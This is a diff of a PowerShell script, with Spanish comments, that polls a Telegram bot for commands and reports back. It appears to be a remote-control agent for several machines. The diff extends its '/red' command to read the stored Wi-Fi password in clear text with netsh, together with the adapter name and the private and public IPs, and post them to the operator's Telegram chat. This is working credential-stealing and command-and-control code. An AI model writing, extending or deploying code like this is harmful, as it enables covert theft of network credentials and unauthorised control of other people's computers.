@@ -48,28 +48,32 @@ while ($true) {
     try {
         $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
         
-        foreach ($Update in $Updates.result) {
+                foreach ($Update in $Updates.result) {
             $LastUpdateID = $Update.update_id + 1
             $TextoRecibido = $Update.message.text
             $RemitenteChatID = $Update.message.chat.id
 
             if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                 
-                # CORRECCIÓN DE MATRIZ: Extraemos de forma segura el comando y el ID del argumento
+                # 1. Separar el texto por espacios de forma estricta
                 $Partes = $TextoRecibido -split " "
+                
+                # OBLIGATORIO: Extraer solo la primera palabra (El comando) usando [0]
                 $Comando = [string]$Partes[0]
                 $Comando = $Comando.ToLower()
                 
+                # OBLIGATORIO: Extraer la segunda palabra (El ID de la PC) usando [1]
                 $IDDestino = ""
                 if ($Partes.Count -gt 1) {
                     $IDDestino = [string]$Partes[1]
                 }
 
-                # 🔥 NUEVO: CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS (100 al 999) fijos por máquina
+                # CÁLCULO UNIFICADO DE ID ÚNICO DE 3 DÍGITOS
                 $Md5 = [System.Security.Cryptography.MD5]::Create()
                 $HashBytes = $Md5.ComputeHash([System.Text.Encoding]::ASCII.GetBytes($MiPC))
                 $IdUnico = ([BitConverter]::ToUInt16($HashBytes, 0) % 900) + 100
                 $MiIDNum = [string]$IdUnico
+
 
                 # --- COMANDO GLOBAL: /lista ---
                 if ($Comando -eq "/lista") {
@@ -123,21 +127,55 @@ while ($true) {
                             continue # 👈 CORREGIDO: Esto evita que se choque con el comando /red
                         }
                         
-                        "/red" {
-                            $IpPrivada = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
+                                                                         "/red" {
+                            # 1. Detectar la placa de red real con conexion activa
+                            $RutaActiva = Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1
+                            
+                            $NombreInterfaz = "No detectada"
+                            $IpPrivada = "No detectada"
+                            $NombreWiFi = "No conectado (Es cable Ethernet)"
+                            $ClaveWiFi = "No aplica"
+
+                            if ($RutaActiva) {
+                                $NombreInterfaz = $RutaActiva.InterfaceAlias
+                                $IpPrivada = (Get-NetIPAddress -InterfaceIndex $RutaActiva.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue).IPAddress
+                                
+                                # 2. Si esta usando Wi-Fi, extraer el nombre de la red y su contraseña
+                                if ($NombreInterfaz -like "*Wi-Fi*" -or $NombreInterfaz -like "*Wireless*") {
+                                    # Obtiene el nombre del perfil de red activo
+                                    $Perfil = (netsh wlan show interfaces | Select-String -Pattern "^\s+SSID\s+:\s+(.+)$")
+                                    if ($Perfil) {
+                                        $NombreWiFi = $Perfil.Matches.Groups[1].Value.Trim()
+                                        
+                                        # Comando nativo para revelar la clave guardada de ese perfil específico
+                                        $XmlInfo = (netsh wlan show profile name="$NombreWiFi" key=clear | Select-String -Pattern "Contenido de la clave\s+:\s+(.+)$")
+                                        if ($XmlInfo) {
+                                            $ClaveWiFi = $XmlInfo.Matches.Groups[1].Value.Trim()
+                                        } else {
+                                            $ClaveWiFi = "No encontrada o red abierta"
+                                        }
+                                    }
+                                }
+                            }
+
+                            # 3. Obtener la IP Publica
                             $IpPublica = "Desconocida"
                             try {
-                                # CORREGIDO: URL limpia de texto plano sin HTML visual externo
-                                $IpPublica = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+                                $IpPublica = (Invoke-RestMethod -Uri "https://icanhazip.com" -TimeoutSec 5).Trim()
                             } catch {}
 
-                            $ReporteRed = "📊 REPORTE DE RED (ID: " + $MiIDNum + ")`n" +
-                                          "🏠 IP Privada (Local): " + $IpPrivada + "`n" +
-                                          "🌍 IP Pública (Internet): " + $IpPublica
+                            # 4. Armar el reporte de texto plano seguro
+                            $ReporteRed = "REPORTE DE RED (ID: $MiIDNum)`nAdaptador: $NombreInterfaz`nNombre Wi-Fi: $NombreWiFi`nClave Wi-Fi: $ClaveWiFi`nIP Privada: $IpPrivada`nIP Publica: $IpPublica"
                                           
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $ReporteRed })
-                            continue # 👈 CORREGIDO: Posición ideal antes de cerrar la llave del comando
+                            continue
                         }
+
+
+
+
+
+
                     } # Cierre limpio del switch
                 }
             }
